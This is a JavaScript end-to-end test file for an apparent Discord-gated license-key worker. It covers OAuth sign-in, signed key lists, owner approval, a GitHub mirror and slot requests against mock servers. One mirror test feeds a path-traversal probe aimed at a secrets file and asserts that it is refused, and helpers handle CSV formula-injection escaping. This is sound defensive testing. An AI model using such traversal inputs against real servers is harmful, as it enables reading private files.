// End-to-end test: runs the worker in wrangler's local runtime (real D1, real WebCrypto)
// against a mock Discord API, then checks the whole "Continue with Discord" flow.
//   npm test
import { spawn, execFileSync } from "node:child_process";
import { createServer } from "node:http";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import assert from "node:assert/strict";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const WORKER_PORT = 8791, APPROVAL_PORT = 8795, DISCORD_PORT = 8792, GUILD = "999000111";
let BASE = `http://127.0.0.1:${WORKER_PORT}`;
const tmp = mkdtempSync(join(tmpdir(), "orbit-license-test-"));

// Discord IDs are snowflakes: the top bits are the account's creation time.
const snowflake = (ms) => String((BigInt(ms) - 1420070400000n) << 22n);
const USERS = {
  alice: { id: snowflake(Date.parse("2019-01-01")), username: "alice", guilds: [GUILD] },
  bob:   { id: snowflake(Date.parse("2020-06-01")), username: "bob", guilds: [GUILD] },
  fresh: { id: snowflake(Date.now() - 2 * 86400000), username: "fresh", guilds: [GUILD] },
  outsider: { id: snowflake(Date.parse("2018-01-01")), username: "outsider", guilds: ["123"] },
  robot: { id: snowflake(Date.parse("2018-01-01")), username: "robot", guilds: [GUILD], bot: true },
  carol: { id: snowflake(Date.parse("2021-03-01")), username: "carol_x", guilds: [] },
  dave:  { id: snowflake(Date.parse("2021-04-01")), username: "dave", guilds: [] },
  erin:  { id: snowflake(Date.parse("2021-05-01")), username: "erin", guilds: [] },
  frank: { id: snowflake(Date.parse("2021-06-01")), username: "frank", guilds: [] },
  gina:  { id: snowflake(Date.parse("2021-07-01")), username: "gina", guilds: [] },
  hana:  { id: snowflake(Date.parse("2021-08-01")), username: "hana", guilds: [] },
  ivan:  { id: snowflake(Date.parse("2021-09-01")), username: "ivan", guilds: [] },
  owen:  { id: snowflake(Date.parse("2021-10-01")), username: "owen", guilds: [] },
  quinn: { id: snowflake(Date.parse("2021-11-01")), username: "quinn", guilds: [] },
};
const OWNER = snowflake(Date.parse("2017-02-01"));   // NOTIFY_USER_ID in approval mode

const mirrorHits = [];   // requests the worker made for /mirror
const MIRROR_UPDATE = { version: "1.9.99", url: "index-1.9.99.html", sha256: "ab".repeat(32), signature: "c2ln", notes: "Sample" };
const MIRROR_PAGE = "<!doctype html><title>FAFO 1.9.99</title><script>window.x = 1</script>\n";
const webhookPosts = [], webhookEdits = [], webhookFail = [];
const buyerHookPosts = [];   // posts to buyers' own webhooks (order alerts)
let webhookHang = null;   // {ms, code}: the next webhook post waits ms, then fails with code (if given)
const discord = createServer(async (req, res) => {
  const chunks = []; for await (const c of req) chunks.push(c);
  const raw = Buffer.concat(chunks), body = raw.toString();
  const send = (code, data) => { res.writeHead(code, { "content-type": "application/json" }); res.end(JSON.stringify(data)); };
  const who = (req.headers.authorization || "").replace("Bearer tok-", "");
  if (req.method === "POST" && req.url === "/oauth2/token") {
    const p = new URLSearchParams(body);
    if (p.get("client_secret") !== "test-secret" || p.get("redirect_uri") !== BASE + "/discord/callback") return send(401, { error: "invalid_client" });
    return USERS[p.get("code")] ? send(200, { access_token: "tok-" + p.get("code"), token_type: "Bearer" }) : send(400, { error: "invalid_grant" });
  }
  if (req.url === "/users/@me" && USERS[who]) { const u = USERS[who]; return send(200, { id: u.id, username: u.username, bot: !!u.bot }); }
  if (req.url === "/users/@me/guilds" && USERS[who]) return send(200, USERS[who].guilds.map((id) => ({ id })));
  const u = new URL(req.url, "http://x");
  if (req.method === "GET" && u.pathname === "/gh.json") return send(200, ghList);
  // GitHub's raw files, for the copy at /mirror (app 1.9.83+).
  if (u.pathname.startsWith("/mirror-src/")) {
    mirrorHits.push(req.url);
    const name = u.pathname.slice("/mirror-src/".length);
    if (name === "update.json") return send(200, MIRROR_UPDATE);
    if (name === "licenses.json") return send(200, ghList);
    if (name === "index-1.9.99.html") { res.writeHead(200, { "content-type": "text/plain" }); return res.end(MIRROR_PAGE); }
    if (name === "index-9.9.9.html") return send(500, { message: "GitHub had a moment" });
    return send(404, {});
  }
  if (req.method === "POST" && u.pathname === "/webhook") {
    if (webhookHang) {
      const hang = webhookHang; webhookHang = null;
      await new Promise((r) => setTimeout(r, hang.ms));
      if (hang.code) return send(hang.code, { message: "fail" });
    }
    if (webhookFail.length) {
      const code = webhookFail.shift();   // 0 lets that post through
      if (code) return code === 429 ? send(429, { message: "You are being rate limited.", retry_after: 0.3 }) : send(code, { message: "fail" });
    }
    let data, files = [];
    if (/^multipart\//.test(req.headers["content-type"] || "")) {
      const form = await new Response(raw, { headers: { "content-type": req.headers["content-type"] } }).formData();
      data = JSON.parse(form.get("payload_json"));
      for (const [k, v] of form) if (k.startsWith("files[")) files.push({ name: v.name, text: await v.text(), type: v.type });
    } else data = JSON.parse(body);
    const m = { id: "msg" + (webhookPosts.length + 1), wait: u.searchParams.get("wait"), files, ...data };
    webhookPosts.push(m); return send(200, { id: m.id });
  }
  if (req.method === "PATCH" && u.pathname.startsWith("/webhook/messages/")) {
    webhookEdits.push({ id: u.pathname.split("/").pop(), ...JSON.parse(body) }); return send(200, {});
  }
  if (req.method === "POST" && u.pathname.startsWith("/buyerhook/")) {
    if (u.pathname.includes("/dead/")) return send(404, { message: "Unknown Webhook" });
    buyerHookPosts.push({ path: u.pathname, ...JSON.parse(body) }); return send(200, {});
  }
  send(404, {});
});

const { publicKey, privateKey } = await crypto.subtle.generateKey({ name: "ECDSA", namedCurve: "P-256" }, true, ["sign", "verify"]);
const privJwk = await crypto.subtle.exportKey("jwk", privateKey);
// A key made by hand, on a signed list like licenses.json on GitHub.
const GH_KEY = "PVLT-GHKE-YGHK-EYGH-KEY2";
const ghHash = Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + GH_KEY.replace(/-/g, "")))), (b) => b.toString(16).padStart(2, "0")).join("");
// Two more for the vault tests, which need licenses of their own.
const VAULT_KEYS = ["PVLT-VAUL-TKEY-AAAA-0001", "PVLT-VAUL-TKEY-AAAA-0002"];
const hashOfKey = async (k) => Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + k.replace(/-/g, "")))), (b) => b.toString(16).padStart(2, "0")).join("");
const ghBody = JSON.stringify({ v: 1, issued: new Date().toISOString(), keys: [{ h: ghHash }, ...await Promise.all(VAULT_KEYS.map(async (k) => ({ h: await hashOfKey(k) })))] });
const ghList = { body: ghBody, sig: Buffer.from(await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, privateKey, new TextEncoder().encode(ghBody))).toString("base64") };
const pubJwk = await crypto.subtle.exportKey("jwk", publicKey);
const common = [
  `DISCORD_CLIENT_ID=test-client`,
  `DISCORD_CLIENT_SECRET=test-secret`,
  `LICENSE_SIGNING_KEY=${JSON.stringify({ kty: "EC", crv: "P-256", x: privJwk.x, y: privJwk.y, d: privJwk.d })}`,
  `ADMIN_TOKEN=test-admin-token`,
  `DISCORD_WEBHOOK_URL=http://127.0.0.1:${DISCORD_PORT}/webhook`,
  `DISCORD_API_BASE=http://127.0.0.1:${DISCORD_PORT}`,
  `GH_LICENSE_URL=http://127.0.0.1:${DISCORD_PORT}/gh.json`,
  `MIRROR_BASE=http://127.0.0.1:${DISCORD_PORT}/mirror-src/`,
  `PULL_STALE_MS=3000`,
  `ACCOUNT_OFFER_TTL_MS=8000`,
  `ACCOUNTS_LOW_AT=3`,
  `ASSIGNED_LIMIT=10`,
  `ALERT_WEBHOOK_TEST_PREFIX=http://127.0.0.1:${DISCORD_PORT}/buyerhook/`,
  `GH_LICENSE_PUB=${JSON.stringify({ kty: "EC", crv: "P-256", x: pubJwk.x, y: pubJwk.y })}`,
];

const env = { ...process.env, NO_PROXY: "127.0.0.1,localhost", no_proxy: "127.0.0.1,localhost", CI: "1" };
// Run wrangler's JS entry with this Node, so it works the same on Windows (where .bin/wrangler is a shell script).
const wrangler = [join(root, "node_modules", "wrangler", "bin", "wrangler.js")];
const workers = [];
let workerLog = () => "";   // the running worker's output, shown when a test fails
// Starts a worker with its own empty database, or on an earlier run's database (`db`).
// `vars` override wrangler.toml's [vars].
async function startWorker(name, port, vars, db) {
  const dir = join(tmp, db || name);
  if (!db) execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", dir, "--file", "schema.sql"], { cwd: root, env, stdio: "pipe" });
  writeFileSync(join(tmp, name + ".env"), [...common, ...vars].join("\n"));
  const dev = spawn(process.execPath, [...wrangler, "dev", "--local", "--ip", "127.0.0.1", "--port", String(port), "--persist-to", dir,
    "--env-file", join(tmp, name + ".env"), "--show-interactive-dev-session=false"], { cwd: root, env, stdio: ["ignore", "pipe", "pipe"] });
  let log = ""; dev.stdout.on("data", (d) => log += d); dev.stderr.on("data", (d) => log += d);
  workerLog = () => log;
  workers.push(dev);
  BASE = `http://127.0.0.1:${port}`;
  for (let i = 0; ; i++) {
    try { if ((await fetch(BASE + "/discord/ready")).ok) return; } catch {}
    if (i > 120) throw new Error("wrangler dev didn't start:\n" + log);
    await new Promise((r) => setTimeout(r, 500));
  }
}
// On Windows, killing wrangler leaves its workerd child running (and holding the database files)
// for a while, so the whole process tree is stopped there.
function stopWorker(w) {
  if (process.platform !== "win32") return w.kill("SIGTERM");
  try { execFileSync("taskkill", ["/pid", String(w.pid), "/t", "/f"], { stdio: "ignore" }); } catch {}
}
await new Promise((r) => discord.listen(DISCORD_PORT, "127.0.0.1", r));

let passed = 0;
const test = async (name, fn) => {
  try { await fn(); passed++; console.log("  ok  " + name); }
  catch (e) { console.log("  FAIL " + name + "\n  worker's last output:\n" + workerLog().slice(-4000)); throw e; }
};
const get = (path, opts = {}) => fetch(BASE + path, { redirect: "manual", ...opts });
const getJson = async (path, opts) => (await get(path, opts)).json();
const rid = () => crypto.randomUUID().replace(/-/g, "");
async function verifyList(list) {
  const sig = Uint8Array.from(atob(list.sig), (c) => c.charCodeAt(0));
  assert.ok(await crypto.subtle.verify({ name: "ECDSA", hash: "SHA-256" }, publicKey, sig, new TextEncoder().encode(list.body)), "list signature verifies");
  return JSON.parse(list.body);
}
async function keyHash(key) {
  const d = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + key.toUpperCase().replace(/[^A-Z0-9]/g, "")));
  return Array.from(new Uint8Array(d), (b) => b.toString(16).padStart(2, "0")).join("");
}
// Runs the browser half: /discord/start, then Discord sends the user back with `code`.
async function signIn(r, code, extra = "") {
  const start = await get("/discord/start?r=" + r);
  assert.equal(start.status, 302);
  const loc = new URL(start.headers.get("location"));
  const state = loc.searchParams.get("state");
  return { loc, state, page: await get(`/discord/callback?state=${encodeURIComponent(state)}${code ? "&code=" + code : ""}${extra}`) };
}
const admin = (path, body) => fetch(BASE + path, { method: body ? "POST" : "GET", headers: { authorization: "Bearer test-admin-token", "content-type": "application/json" }, body: body && JSON.stringify(body) });
// Slot CSVs reach the channel with number cells (and any cell starting with = + - @) as ="…" Excel text.
// csvRows parses a CSV; asShown parses one and reads each ="…" cell (parts joined with &) as Excel shows it.
function csvRows(text) {
  const rows = []; let row = [], cur = "", q = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (q) { if (ch === '"') { if (text[i + 1] === '"') { cur += '"'; i++; } else q = false; } else cur += ch; }
    else if (ch === '"') q = true;
    else if (ch === ",") { row.push(cur); cur = ""; }
    else if (ch === "\n" || ch === "\r") { if (ch === "\r" && text[i + 1] === "\n") i++; row.push(cur); rows.push(row); row = []; cur = ""; }
    else cur += ch;
  }
  if (cur || row.length) { row.push(cur); rows.push(row); }
  return rows;
}
const EXCEL_STRINGS = /^=(?:"(?:[^"]|"")*")(?:&"(?:[^"]|"")*")*$/;
const shown = (v) => EXCEL_STRINGS.test(v) ? [...v.slice(1).matchAll(/"((?:[^"]|"")*)"/g)].map((m) => m[1].replace(/""/g, '"')).join("") : v;
const asShown = (text) => csvRows(text).map((r) => r.map(shown));
// A batch's files other than the AYCD lists (2026-10-06+) and Shikari CSVs (2026-10-09+), those lists parsed, and the
// Shikari files.
const plain = (m) => m.files.filter((f) => !f.name.endsWith("-aycd.json") && !f.name.endsWith("-shikari.csv"));
const aycdOf = (m) => m.files.filter((f) => f.name.endsWith("-aycd.json")).map((f) => JSON.parse(f.text));
const shikariOf = (m) => m.files.filter((f) => f.name.endsWith("-shikari.csv"));
const cellT = (v) => /[",\n\r]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;

try {
  console.log("Automatic mode");
  await startWorker("auto", WORKER_PORT, ["REQUIRE_APPROVAL=", `REQUIRED_GUILD_ID=${GUILD}`, "MIN_ACCOUNT_AGE_DAYS=30"]);
  let aliceKey, firstIssued;
  await test("ready reports configured", async () => assert.deepEqual(await getJson("/discord/ready"), { ready: true }));
  // A copy of GitHub's files for networks that block raw.githubusercontent.com (app 1.9.83+).
  await test("mirror: update.json, a page and licenses.json come as GitHub has them", async () => {
    mirrorHits.length = 0;
    const u = await get("/mirror/update.json?t=123");
    assert.equal(u.status, 200);
    assert.deepEqual(await u.json(), MIRROR_UPDATE);
    assert.match(u.headers.get("content-type"), /^application\/json/);
    assert.equal(u.headers.get("access-control-allow-origin"), "*");
    assert.equal(u.headers.get("cache-control"), "no-store");
    const p = await get("/mirror/index-1.9.99.html");
    assert.equal(p.status, 200);
    assert.equal(await p.text(), MIRROR_PAGE);
    assert.match(p.headers.get("content-type"), /^text\/plain/);
    assert.equal(p.headers.get("x-content-type-options"), "nosniff");
    const l = await get("/mirror/licenses.json");
    assert.deepEqual(await l.json(), ghList);
    assert.deepEqual(mirrorHits, ["/mirror-src/update.json", "/mirror-src/index-1.9.99.html", "/mirror-src/licenses.json"], "fetched by name only, without the query");
  });
  await test("mirror: a page GitHub doesn't have is 404, a GitHub error is 502", async () => {
    const a = await get("/mirror/index-1.9.98.html");
    assert.equal(a.status, 404);
    assert.equal(a.headers.get("cache-control"), "no-store");
    assert.equal((await get("/mirror/index-9.9.9.html")).status, 502);
  });
  await test("mirror: nothing but those files, and only GET", async () => {
    mirrorHits.length = 0;
    for (const p of ["/mirror/licenses.json.js", "/mirror/index-1.9.99.html.js", "/mirror/index-1.9.html", "/mirror/README.md", "/mirror/..%2Fsecrets.json",
      "/mirror/license-worker/src/index.js", "/mirror/", "/mirror/update.json/x", "/mirror/UPDATE.JSON", "/mirror/index-1.9.99.htm"]) {
      assert.equal((await get(p)).status, 404, p);
    }
    assert.equal((await get("/mirror/update.json", { method: "POST", body: "{}" })).status, 404);
    assert.deepEqual(mirrorHits, [], "GitHub wasn't asked for any of them");
  });
  await test("empty list is signed", async () => {
    const b = await verifyList(await getJson("/licenses"));
    assert.deepEqual(b.keys, []); firstIssued = b.issued;
  });
  await test("start rejects a bad request id", async () => assert.equal((await get("/discord/start?r=short")).status, 400));
  await test("start redirects to Discord with state, scopes and callback", async () => {
    const r = rid();
    const res = await get("/discord/start?r=" + r);
    const loc = new URL(res.headers.get("location"));
    assert.equal(loc.origin + loc.pathname, "https://discord.com/oauth2/authorize");
    assert.equal(loc.searchParams.get("client_id"), "test-client");
    assert.equal(loc.searchParams.get("redirect_uri"), BASE + "/discord/callback");
    assert.equal(loc.searchParams.get("scope"), "identify guilds");
    assert.ok(loc.searchParams.get("state").length >= 30);
    assert.deepEqual(await getJson("/discord/status/" + r), { status: "pending" });
  });
  await test("sign-in issues a key the app can pick up", async () => {
    const r = rid();
    const { page } = await signIn(r, "alice");
    assert.equal(page.status, 200);
    const html = await page.text();
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued");
    assert.equal(s.username, "alice");
    assert.match(s.key, /^PVLT(-[A-Z0-9]{4}){4}$/);
    assert.ok(html.includes(s.key), "callback page shows the key");
    const b = await verifyList(s.list);
    assert.deepEqual(b.keys.map((k) => k.h), [await keyHash(s.key)]);
    assert.ok(b.issued > firstIssued, "a changed list has a later issued time");
    aliceKey = s.key;
  });
  await test("owner's channel is told about the new key (without the key)", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
    assert.match(webhookPosts[0].content, /@alice/);
    assert.ok(!webhookPosts[0].content.includes(aliceKey));
    assert.ok(!webhookPosts[0].content.includes("<@"), "no NOTIFY_USER_ID, no ping");
    assert.deepEqual(webhookPosts[0].allowed_mentions, { parse: [] });
  });
  await test("the same Discord account gets the same key again", async () => {
    const r = rid();
    await signIn(r, "alice");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.key, aliceKey);
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1, "no second notice");
  });
  await test("reloading the callback page doesn't redo anything", async () => {
    const r = rid();
    const { state } = await signIn(r, "bob");
    const again = await get(`/discord/callback?state=${state}&code=bob`);
    assert.equal(again.status, 200);
    const html = await again.text();
    assert.match(html, /all set/);
    assert.match(html, /<title>FAFO · You&#39;re all set<\/title>/); assert.match(html, /<h1>FAFO<\/h1>/); assert.match(html, /family=Bruno\+Ace\+SC&text=FAFO/);
    assert.match(html, /Go back to FAFO/); assert.doesNotMatch(html, /Orbit/);
    const b = await verifyList(await getJson("/licenses"));
    assert.equal(b.keys.length, 2);
  });
  await test("a list with no changes isn't re-signed", async () => {
    const a = await getJson("/licenses"), b = await getJson("/licenses");
    assert.equal(a.body, b.body); assert.equal(a.sig, b.sig);
  });
  await test("cancelled sign-in reports an error to the app", async () => {
    const r = rid();
    const { page } = await signIn(r, "", "&error=access_denied");
    assert.equal(page.status, 400);
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /cancelled/);
  });
  await test("bad code from Discord is an error", async () => {
    const r = rid();
    const { page } = await signIn(r, "nobody");
    assert.equal(page.status, 502);
    assert.equal((await getJson("/discord/status/" + r)).status, "error");
  });
  await test("bots are turned away", async () => {
    const r = rid(); await signIn(r, "robot");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /Bot/);
  });
  await test("accounts younger than MIN_ACCOUNT_AGE_DAYS are turned away", async () => {
    const r = rid(); await signIn(r, "fresh");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /30 days/);
  });
  await test("non-members of REQUIRED_GUILD_ID are turned away", async () => {
    const r = rid(); await signIn(r, "outsider");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /member/);
  });
  await test("unknown state and unknown request id", async () => {
    assert.equal((await get("/discord/callback?state=nope&code=alice")).status, 400);
    assert.equal((await get("/discord/status/" + rid())).status, 404);
  });
  await test("admin needs the token", async () => {
    assert.equal((await get("/admin/licenses")).status, 401);
    assert.equal((await get("/admin/licenses", { headers: { authorization: "Bearer wrong" } })).status, 401);
  });
  await test("admin lists issued keys", async () => {
    const { licenses } = await (await admin("/admin/licenses")).json();
    assert.deepEqual(licenses.map((l) => l.username).sort(), ["alice", "bob"]);
  });
  await test("revoking a key removes it from the signed list", async () => {
    const before = await verifyList(await getJson("/licenses"));
    assert.deepEqual(await (await admin("/admin/revoke", { key: aliceKey.toLowerCase() })).json(), { ok: true, changed: 1 });
    const after = await verifyList(await getJson("/licenses"));
    assert.ok(!after.keys.some((k) => k.h === before.keys[0].h));
    assert.equal(after.keys.length, 1);
    assert.ok(after.issued > before.issued);
  });
  await test("a revoked account can't get its key back by signing in", async () => {
    const r = rid(); const { page } = await signIn(r, "alice");
    assert.equal(page.status, 403);
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /turned off/);
  });
  await test("restoring a key puts it back", async () => {
    await admin("/admin/restore", { discord_id: USERS.alice.id });
    const b = await verifyList(await getJson("/licenses"));
    const h = await keyHash(aliceKey);
    assert.ok(b.keys.some((k) => k.h === h));
    assert.equal(b.keys.length, 2);
  });
  await test("too many starts from one address are refused", async () => {
    let last;
    for (let i = 0; i < 25; i++) last = await get("/discord/start?r=" + rid());
    assert.equal(last.status, 429);
  });

  console.log("\nApproval mode");
  await startWorker("approval", APPROVAL_PORT, ["REQUIRE_APPROVAL=true", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0", `NOTIFY_USER_ID=${OWNER}, not-an-id, ${OWNER}`]);
  webhookPosts.length = 0;
  let carolR, carolLink, carolKey;
  const reviewPost = (link, action, t) => fetch(link.split("?")[0], { method: "POST", redirect: "manual",
    body: new URLSearchParams({ t: t ?? new URL(link).searchParams.get("t"), action }) });
  const linkIn = (content) => (content.match(/\((http[^)]+\/review\/[^)]+)\)/) || [])[1];
  await test("sign-in creates a request instead of a key", async () => {
    carolR = rid();
    const { page } = await signIn(carolR, "carol");
    assert.equal(page.status, 200);
    assert.match(await page.text(), /Request sent/);
    const s = await getJson("/discord/status/" + carolR);
    assert.equal(s.status, "review"); assert.match(s.error, /approves/);
    assert.equal(s.key, undefined);
    assert.deepEqual((await verifyList(await getJson("/licenses"))).keys, []);
  });
  await test("the request is posted to the owner's channel with a review link", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
    const m = webhookPosts[0];
    assert.equal(m.wait, "true"); assert.equal(m.flags, 4);
    assert.match(m.content, /New FAFO key request/);
    assert.match(m.content, /@carol\\_x/, "username markdown is escaped");
    assert.match(m.content, new RegExp("Discord ID " + USERS.carol.id));
    assert.ok(m.content.startsWith(`<@${OWNER}> 📝`), "NOTIFY_USER_ID is pinged first: " + m.content);
    assert.deepEqual(m.allowed_mentions, { parse: [], users: [OWNER] }, "and nobody else can be");
    carolLink = linkIn(m.content);
    assert.ok(carolLink.startsWith(BASE + "/review/" + USERS.carol.id + "?t="));
  });
  await test("signing in again while waiting doesn't post again", async () => {
    const r = rid(); await signIn(r, "carol");
    assert.equal((await getJson("/discord/status/" + r)).status, "review");
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
  });
  await test("the review page shows the request and changes nothing by itself", async () => {
    const res = await fetch(carolLink);
    assert.equal(res.status, 200);
    const html = await res.text();
    assert.match(html, /@carol_x/); assert.match(html, /Waiting for your decision/);
    assert.doesNotMatch(html, /PVLT-/, "no key before approval");
    assert.match(html, /value="approve"/); assert.match(html, /value="deny"/);
    assert.equal((await getJson("/discord/status/" + carolR)).status, "review");
  });
  await test("a wrong or missing review token is refused", async () => {
    assert.equal((await fetch(carolLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
    assert.equal((await fetch(BASE + "/review/" + USERS.carol.id)).status, 404);
    assert.equal((await reviewPost(carolLink, "approve", "wrong")).status, 404);
    assert.equal((await getJson("/discord/status/" + carolR)).status, "review");
  });
  await test("approving issues the key, and the waiting app picks it up", async () => {
    const res = await reviewPost(carolLink, "approve");
    assert.equal(res.status, 200); assert.match(await res.text(), /Approved/);
    const s = await getJson("/discord/status/" + carolR);
    assert.equal(s.status, "issued"); assert.match(s.key, /^PVLT-/);
    assert.ok((await (await fetch(carolLink)).text()).includes(s.key), "review page shows the key once approved");
    const b = await verifyList(s.list);
    assert.deepEqual(b.keys.map((k) => k.h), [await keyHash(s.key)]);
    carolKey = s.key;
  });
  await test("the channel message is updated with the decision", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookEdits.length, 1);
    assert.equal(webhookEdits[0].id, webhookPosts[0].id);
    assert.match(webhookEdits[0].content, /Approved/);
    assert.equal(linkIn(webhookEdits[0].content), carolLink, "link still there to change the decision");
    assert.equal(webhookPosts.length, 1, "no separate 'key issued' notice");
    assert.ok(!webhookEdits[0].content.includes("<@"), "a decision doesn't ping again");
    assert.deepEqual(webhookEdits[0].allowed_mentions, { parse: [] });
  });
  await test("once approved, signing in gives the key straight away", async () => {
    const r = rid(); await signIn(r, "carol");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued"); assert.equal(s.key, carolKey);
  });
  let daveR, daveLink;
  await test("denying tells the app the request was declined", async () => {
    daveR = rid(); await signIn(daveR, "dave");
    await new Promise((r) => setTimeout(r, 300));
    daveLink = linkIn(webhookPosts[1].content);
    const res = await reviewPost(daveLink, "deny");
    assert.match(await res.text(), /Denied/);
    const s = await getJson("/discord/status/" + daveR);
    assert.equal(s.status, "error"); assert.match(s.error, /declined/);
    await new Promise((r) => setTimeout(r, 300));
    assert.match(webhookEdits.at(-1).content, /Denied/);
  });
  await test("a denied account signing in again is told, without a new post", async () => {
    const r = rid(); const { page } = await signIn(r, "dave");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 2);
  });
  await test("changing a denial to approval issues the key", async () => {
    await reviewPost(daveLink, "approve");
    const r = rid(); await signIn(r, "dave");
    assert.equal((await getJson("/discord/status/" + r)).status, "issued");
  });
  await test("denying after approval turns the key off", async () => {
    await reviewPost(carolLink, "deny");
    const b = await verifyList(await getJson("/licenses"));
    const h = await keyHash(carolKey);
    assert.ok(!b.keys.some((k) => k.h === h));
    const r = rid(); const { page } = await signIn(r, "carol");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
    assert.doesNotMatch(await (await fetch(carolLink)).text(), /PVLT-/, "no key once denied");
  });
  await test("admin lists requests and decisions, with working review links", async () => {
    const { applications } = await (await admin("/admin/applications")).json();
    assert.deepEqual(applications.map((a) => [a.username, a.status]).sort(), [["carol_x", "denied"], ["dave", "approved"]]);
    const dave = applications.find((a) => a.username === "dave");
    assert.equal(dave.review_token, undefined);
    assert.equal(dave.review_url, daveLink);
    assert.equal((await fetch(dave.review_url)).status, 200);
  });
  await test("a request whose channel post failed is posted again on the next sign-in", async () => {
    const before = webhookPosts.length;
    webhookFail.push(500);
    const r1 = rid(); await signIn(r1, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before, "first post failed");
    assert.equal((await getJson("/discord/status/" + r1)).status, "review");
    const r2 = rid(); await signIn(r2, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content, /@erin/);
    const r3 = rid(); await signIn(r3, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before + 1, "not posted again once it went through");
  });
  await test("a rate-limited post waits as Discord asks and goes through", async () => {
    const before = webhookPosts.length;
    webhookFail.push(429);
    await signIn(rid(), "gina");
    await new Promise((r) => setTimeout(r, 1500));
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content, /@gina/);
  });
  await test("denying someone before they had a key", async () => {
    const erinLink = linkIn(webhookPosts.find((m) => /@erin/.test(m.content)).content);
    await reviewPost(erinLink, "deny");
    const r = rid(); const { page } = await signIn(r, "erin");
    assert.equal(page.status, 403);
  });

  console.log("\nApproval switched off again, same database");
  stopWorker(workers.pop());
  await new Promise((r) => setTimeout(r, 1500));
  await startWorker("approval-off", APPROVAL_PORT + 1, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0"], "approval");
  await test("denied accounts stay declined", async () => {
    const r = rid(); const { page } = await signIn(r, "erin");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
  });
  let frankKey;
  await test("new accounts get a key straight away again", async () => {
    const r = rid(); await signIn(r, "frank");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued"); assert.match(s.key, /^PVLT-/);
    frankKey = s.key;
  });

  console.log("\nSlots");
  const slots = (path, key, body) => fetch(BASE + path, { method: body ? "POST" : "GET", headers: { ...(key ? { authorization: "Bearer " + key } : {}), "content-type": "application/json" }, body: body && JSON.stringify(body) });
  const slotLink = (content) => (content.match(/\((http[^)]+\/slots\/review\/[^)]+)\)/) || [])[1];
  const slotPost = (link, action, amount) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action, ...(amount != null ? { amount: String(amount) } : {}) }) });
  let frankLink;
  await test("the limit needs a valid license key", async () => {
    assert.equal((await slots("/slots/limit")).status, 401);
    assert.equal((await slots("/slots/limit", "PVLT-AAAA-BBBB-CCCC-DDDD")).status, 401);
    assert.equal((await slots("/slots/limit", "not a key")).status, 401);
  });
  await test("everyone starts at 20 slots", async () => {
    assert.deepEqual(await (await slots("/slots/limit", frankKey)).json(), { limit: 20, request: null, canRequest: true });
  });
  await test("keys made by hand (the GitHub list) work too", async () => {
    assert.equal((await (await slots("/slots/limit", GH_KEY.toLowerCase())).json()).limit, 20);
  });
  await test("asking for fewer slots than you have, or too many, is refused", async () => {
    assert.equal((await slots("/slots/request", frankKey, { requested: 20 })).status, 400);
    assert.equal((await slots("/slots/request", frankKey, { requested: 501 })).status, 400);
    assert.equal((await slots("/slots/request", frankKey, { requested: "lots" })).status, 400);
  });
  await test("a request is posted to the owner's channel with a review link", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/slots/request", frankKey, { requested: 40, name: "Frank_the_*shopper*", note: "Big drop\nthis weekend" })).json();
    assert.equal(r.status, "pending"); assert.equal(r.request.requested, 40);
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, /More slots requested/); assert.match(m, /20 → 40 slots/);
    assert.match(m, /Frank\\_the\\_\\\*shopper\\\*/, "name is markdown-escaped");
    assert.match(m, /@frank/); assert.match(m, new RegExp("license …" + frankKey.slice(-4)));
    assert.match(m, /Big drop this weekend/, "note kept on one line");
    frankLink = slotLink(m);
    assert.ok(frankLink.startsWith(BASE + "/slots/review/"));
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 20); assert.equal(lim.request.status, "pending");
  });
